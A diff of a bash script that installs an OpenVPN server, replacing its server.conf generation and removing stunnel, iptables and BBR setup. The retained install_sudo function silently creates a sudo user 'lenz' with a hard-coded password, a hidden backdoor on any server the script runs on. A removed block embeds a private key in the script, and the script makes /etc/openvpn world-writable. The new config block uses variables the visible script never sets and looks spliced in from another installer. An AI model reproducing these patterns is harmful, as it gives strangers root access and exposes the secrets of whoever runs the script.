@@ -115,10 +115,20 @@ echo "Installing openvpn."
 
 
 mkdir -p /etc/openvpn/easy-rsa/keys
-mkdir -p /etc/openvpn/login
 mkdir -p /etc/openvpn/server
 mkdir -p /var/www/html/stat
-touch /etc/openvpn/server2.conf
+touch /etc/openvpn//server/server.conf
+
+
+
+
+
+
+
+
+
+
+
 
 CLIENT="server1"
 
@@ -176,55 +186,96 @@ ssbzSibBsu/6iGtCOGEoXJf//////////wIBAg==
 
 
 
-
-
-
-
 echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 
 
 
-echo '#Openvpn Configuration by Firenet Developer :)
+# Generate server.conf
+	echo "port $PORT
+proto $PROTOCOL
 dev tun
-port 1194
-proto tcp
-server 10.20.0.0 255.255.0.0
-ca /etc/openvpn/server/easy-rsa/pki/ca.crt
-cert /etc/openvpn/server/easy-rsa/pki/issued/$1.crt
-key /etc/openvpn/server/easy-rsa/pki/private/$1.key
-dh /etc/openvpn/server/dh.pem
-ncp-disable
-tls-server
-tls-version-min 1.2
-tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
-cipher none
-auth none
+sndbuf 0
+rcvbuf 0
+ca ca.crt
+cert server.crt
+key server.key
+dh dh.pem
+duplicate-cn
+auth SHA512
+tls-auth ta.key 0
+topology subnet
+server 10.8.0.0 255.255.255.0
+ifconfig-pool-persist ipp.txt" > /etc/openvpn/server/server.conf
+echo 'push "redirect-gateway def1 bypass-dhcp"' >> /etc/openvpn/server/server.conf
+	
+# Set default DNS values
+DNS_1="8.8.8.8"
+DNS_2="8.8.4.4"
+echo "keepalive 10 120
+cipher AES-256-CBC
+user nobody
+group $GROUPNAME
 persist-key
 persist-tun
-ping-timer-rem
-compress lz4-v2
-keepalive 10 120
-reneg-sec 86400
-user nobody
-group nogroup
-client-to-client
-duplicate-cn
-username-as-common-name
-verify-client-cert none
-script-security 3
-push "redirect-gateway def1 bypass-dhcp"
-push "dhcp-option DNS 8.8.8.8"
-push "dhcp-option DNS 8.8.4.4"
-push "compress lz4-v2"
-push "persist-key"
-push "persist-tun"
-client-connect /etc/openvpn/login/connect.sh
-client-disconnect /etc/openvpn/login/disconnect.sh
-log /etc/openvpn/server/tcpserver.log
-status /etc/openvpn/server/tcpclient.log
-status-version 2
-verb 3' > /etc/openvpn/server2.conf
+status openvpn-status.log
+verb 3
+crl-verify crl.pem" >> /etc/openvpn/server/server.conf
+	# Enable net.ipv4.ip_forward for the system
+	echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/30-openvpn-forward.conf
+	# Enable without waiting for a reboot or service restart
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	if pgrep firewalld; then
+		# Using both permanent and not permanent rules to avoid a firewalld
+		# reload.
+		# We don't use --add-service=openvpn because that would only work with
+		# the default port and protocol.
+		firewall-cmd --add-port=$PORT/$PROTOCOL
+		firewall-cmd --zone=trusted --add-source=10.8.0.0/24
+		firewall-cmd --permanent --add-port=$PORT/$PROTOCOL
+		firewall-cmd --permanent --zone=trusted --add-source=10.8.0.0/24
+		# Set NAT for the VPN subnet
+		firewall-cmd --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
+		firewall-cmd --permanent --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
+	else
+		# Create a service to set up persistent iptables rules
+		echo "[Unit]
+Before=network.target
+[Service]
+Type=oneshot
+ExecStart=/sbin/iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
+ExecStart=/sbin/iptables -I INPUT -p $PROTOCOL --dport $PORT -j ACCEPT
+ExecStart=/sbin/iptables -I FORWARD -s 10.8.0.0/24 -j ACCEPT
+ExecStart=/sbin/iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
+ExecStop=/sbin/iptables -t nat -D POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
+ExecStop=/sbin/iptables -D INPUT -p $PROTOCOL --dport $PORT -j ACCEPT
+ExecStop=/sbin/iptables -D FORWARD -s 10.8.0.0/24 -j ACCEPT
+ExecStop=/sbin/iptables -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
+RemainAfterExit=yes
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/openvpn-iptables.service
+		systemctl enable --now openvpn-iptables.service
+	fi
+	# If SELinux is enabled and a custom port was selected, we need this
+	if sestatus 2>/dev/null | grep "Current mode" | grep -q "enforcing" && [[ "$PORT" != '1194' ]]; then
+		# Install semanage if not already present
+		if ! hash semanage 2>/dev/null; then
+			if grep -qs "CentOS Linux release 7" "/etc/centos-release"; then
+				yum install policycoreutils-python -y
+			else
+				yum install policycoreutils-python-utils -y
+			fi
+		fi
+		semanage port -a -t openvpn_port_t -p $PROTOCOL $PORT
+	fi
+	# And finally, enable and start the OpenVPN service
+	systemctl enable --now openvpn-server@server.service
+	# If the server is behind a NAT, use the correct IP address
+	if [[ "$PUBLICIP" != "" ]]; then
+		IP=$PUBLICIP
+	fi
+
+
 
 
 
@@ -234,54 +285,13 @@ mysql -h "$HOST" -u "$USER" -p"$PASS" "$DBNAME" -e "UPDATE server_list SET confi
 	
 
 
-cat <<\EOM >/etc/openvpn/login/config.sh
-#!/bin/bash
-HOST='DBHOST'
-USER='DBUSER'
-PASS='DBPASS'
-DB='DBNAME'
-EOM
-
-sed -i "s|DBHOST|$HOST|g" /etc/openvpn/login/config.sh
-sed -i "s|DBUSER|$USER|g" /etc/openvpn/login/config.sh
-sed -i "s|DBPASS|$PASS|g" /etc/openvpn/login/config.sh
-sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
-
-
-#client-connect file
-cat <<'LENZ05' >/etc/openvpn/login/connect.sh
-#!/bin/bash
-. /etc/openvpn/login/config.sh
-##set status online to user connected
-server_ip=SERVER_IP
-datenow=`date +"%Y-%m-%d %T"`
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE server_list SET online=online+1 WHERE server_ip='$server_ip' "
-LENZ05
-
-sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
-
-#TCP client-disconnect file
-cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
-#!/bin/bash
-. /etc/openvpn/login/config.sh
-server_ip=SERVER_IP
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE server_list SET online=online-1 WHERE server_ip='$server_ip' "
-LENZ06
-
-sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/disconnect.sh
 
 
 
 
-
-dos2unix /etc/openvpn/login/connect.sh
-dos2unix /etc/openvpn/login/disconnect.sh
 
 chmod 777 -R /etc/openvpn/
-chmod 755 /etc/openvpn/server2.conf
-chmod 755 /etc/openvpn/login/connect.sh
-chmod 755 /etc/openvpn/login/disconnect.sh
-chmod 755 /etc/openvpn/login/config.sh
+chmod 755 /etc/openvpn//server/server.conf
 
 
 
@@ -313,106 +323,6 @@ newclient () {
 
 
 
-install_firewall_kvm () {
-clear
-echo "Installing iptables."
-echo "net.ipv4.ip_forward=1
-net.ipv4.conf.all.rp_filter=0
-net.ipv4.conf.eth0.rp_filter=0" >> /etc/sysctl.conf
-sysctl -p
-{
-iptables -F
-iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 10000:50000 -j DNAT --to-destination :5666
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
-iptables-save > /etc/iptables_rules.v4
-ip6tables-save > /etc/iptables_rules.v6
-}&>/dev/null
-}
-
-install_stunnel() {
-  {
-cd /etc/stunnel/ || exit
-
-echo "-----BEGIN PRIVATE KEY-----
-MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClmgCdm7RB2VWK
-wfH8HO/T9bxEddWDsB3fJKpM/tiVMt4s/WMdGJtFdRlxzUb03u+HT6t00sLlZ78g
-ngjxLpJGFpHAGdVf9vACBtrxv5qcrG5gd8k7MJ+FtMTcjeQm8kVRyIW7cOWxlpGY
-6jringYZ6NcRTrh/OlxIHKdsLI9ddcekbYGyZVTm1wd22HVG+07PH/AeyY78O2+Z
-tbjxGTFRSYt3jUaFeUmWNtxqWnR4MPmC+6iKvUKisV27P89g8v8CiZynAAWRJ0+A
-qp+PWxwHi/iJ501WdLspeo8VkXIb3PivyIKC356m+yuuibD2uqwLZ2//afup84Qu
-pRtgW/PbAgMBAAECggEAVo/efIQUQEtrlIF2jRNPJZuQ0rRJbHGV27tdrauU6MBT
-NG8q7N2c5DymlT75NSyHRlKVzBYTPDjzxgf1oqR2X16Sxzh5uZTpthWBQtal6fmU
-JKbYsDDlYc2xDZy5wsXnCC3qAaWs2xxadPUS3Lw/cjGsoeZlOFP4QtV/imLseaws
-7r4KZE7SVO8dF8Xtcy304Bd7UsKClnbCrGsABUF/rqA8g34o7yrpo9XqcwbF5ihQ
-TbnB0Ns8Bz30pjgGjJZTdTL3eskP9qMJWo/JM76kSaJWReoXTws4DlQHxO29z3eK
-zKdxieXaBGMwFnv23JvXKJ5eAnxzqsL6a+SuNPPN4QKBgQDQhisSDdjUJWy0DLnJ
-/HjtsnQyfl0efOqAlUEir8r5IdzDTtAEcW6GwPj1rIOm79ZeyysT1pGN6eulzS1i
-6lz6/c5uHA9Z+7LT48ZaQjmKF06ItdfHI9ytoXaaQPMqW7NnyOFxCcTHBabmwQ+E
-QZDFkM6vVXL37Sz4JyxuIwCNMQKBgQDLThgKi+L3ps7y1dWayj+Z0tutK2JGDww7
-6Ze6lD5gmRAURd0crIF8IEQMpvKlxQwkhqR4vEsdkiFFJQAaD+qZ9XQOkWSGXvKP
-A/yzk0Xu3qL29ZqX+3CYVjkDbtVOLQC9TBG60IFZW79K/Zp6PhHkO8w6l+CBR+yR
-X4+8x1ReywKBgQCfSg52wSski94pABugh4OdGBgZRlw94PCF/v390En92/c3Hupa
-qofi2mCT0w/Sox2f1hV3Fw6jWNDRHBYSnLMgbGeXx0mW1GX75OBtrG8l5L3yQu6t
-SeDWpiPim8DlV52Jp3NHlU3DNrcTSOFgh3Fe6kpot56Wc5BJlCsliwlt0QKBgEol
-u0LtbePgpI2QS41ewf96FcB8mCTxDAc11K6prm5QpLqgGFqC197LbcYnhUvMJ/eS
-W53lHog0aYnsSrM2pttr194QTNds/Y4HaDyeM91AubLUNIPFonUMzVJhM86FP0XK
-3pSBwwsyGPxirdpzlNbmsD+WcLz13GPQtH2nPTAtAoGAVloDEEjfj5gnZzEWTK5k
-4oYWGlwySfcfbt8EnkY+B77UVeZxWnxpVC9PhsPNI1MTNET+CRqxNZzxWo3jVuz1
-HtKSizJpaYQ6iarP4EvUdFxHBzjHX6WLahTgUq90YNaxQbXz51ARpid8sFbz1f37
-jgjgxgxbitApzno0E2Pq/Kg=
------END PRIVATE KEY-----
------BEGIN CERTIFICATE-----
-MIIDRTCCAi2gAwIBAgIUOvs3vdjcBtCLww52CggSlAKafDkwDQYJKoZIhvcNAQEL
-BQAwMjEQMA4GA1UEAwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNV
-BAYTAlBIMB4XDTIxMDcwNzA1MzQwN1oXDTMxMDcwNTA1MzQwN1owMjEQMA4GA1UE
-AwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNVBAYTAlBIMIIBIjAN
-BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApZoAnZu0QdlVisHx/Bzv0/W8RHXV
-g7Ad3ySqTP7YlTLeLP1jHRibRXUZcc1G9N7vh0+rdNLC5We/IJ4I8S6SRhaRwBnV
-X/bwAgba8b+anKxuYHfJOzCfhbTE3I3kJvJFUciFu3DlsZaRmOo64p4GGejXEU64
-fzpcSBynbCyPXXXHpG2BsmVU5tcHdth1RvtOzx/wHsmO/DtvmbW48RkxUUmLd41G
-hXlJljbcalp0eDD5gvuoir1CorFduz/PYPL/AomcpwAFkSdPgKqfj1scB4v4iedN
-VnS7KXqPFZFyG9z4r8iCgt+epvsrromw9rqsC2dv/2n7qfOELqUbYFvz2wIDAQAB
-o1MwUTAdBgNVHQ4EFgQUcKFL6tckon2uS3xGrpe1Zpa68VEwHwYDVR0jBBgwFoAU
-cKFL6tckon2uS3xGrpe1Zpa68VEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0B
-AQsFAAOCAQEAYQP0S67eoJWpAMavayS7NjK+6KMJtlmL8eot/3RKPLleOjEuCdLY
-QvrP0Tl3M5gGt+I6WO7r+HKT2PuCN8BshIob8OGAEkuQ/YKEg9QyvmSm2XbPVBaG
-RRFjvxFyeL4gtDlqb9hea62tep7+gCkeiccyp8+lmnS32rRtFa7PovmK5pUjkDOr
-dpvCQlKoCRjZ/+OfUaanzYQSDrxdTSN8RtJhCZtd45QbxEXzHTEaICXLuXL6cmv7
-tMuhgUoefS17gv1jqj/C9+6ogMVa+U7QqOvL5A7hbevHdF/k/TMn+qx4UdhrbL5Q
-enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
------END CERTIFICATE-----" >> stunnel.pem
-
-echo "debug = 0
-output = /tmp/stunnel.log
-cert = /etc/stunnel/stunnel.pem
-[openvpn-tcp]
-connect = PORT_TCP  
-accept = 443 
-[openvpn-udp]
-connect = PORT_UDP
-accept = 444
-" >> stunnel.conf
-
-sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/stunnel/stunnel.conf
-sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/stunnel/stunnel.conf
-cd /etc/default && rm stunnel4
-
-echo 'ENABLED=1
-FILES="/etc/stunnel/*.conf"
-OPTIONS=""
-PPP_RESTART=0
-RLIMITS=""' >> stunnel4 
-
-chmod 755 stunnel4
-sudo service stunnel4 restart
-  } &>/dev/null
-}
-
 install_sudo(){
   {
     useradd -m lenz 2>/dev/null; echo lenz:@@Password123 | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
@@ -423,16 +333,7 @@ install_sudo(){
 }
 
 
-installBBR() {
-    echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
-    echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
-    sysctl -p
-    
-    apt install -y linux-generic-hwe-20.04
-    grub-set-default 0
-    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
-    INSTALL_BBR=true
-}
+
 
 install_rclocal(){
   {
@@ -493,6 +394,11 @@ sed -i "s|SERVERIP|$server_ip|g" /etc/.counter
   }&>/dev/null
 }
 
+
+
+
+
+
 start_service () {
 clear
 echo 'Starting..'
@@ -523,10 +429,6 @@ server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 install_require
 install_sudo  
 
-installBBR
-install_squid
 install_openvpn
-install_firewall_kvm
-install_stunnel
 install_rclocal
 start_service
